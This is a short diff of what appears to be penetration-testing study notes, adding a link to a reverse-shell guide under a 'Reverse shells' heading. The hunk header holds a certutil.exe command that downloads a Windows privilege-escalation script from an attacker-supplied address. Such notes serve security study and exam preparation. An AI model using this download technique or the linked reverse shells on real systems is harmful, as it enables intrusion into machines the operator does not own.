@@ -8,3 +8,4 @@ certutil.exe -urlcache -split -f "http://$IP/windowsprivchecker.bat" C:\Windows\
 
 Reverse shells 
 https://www.puckiestyle.nl/
+https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html
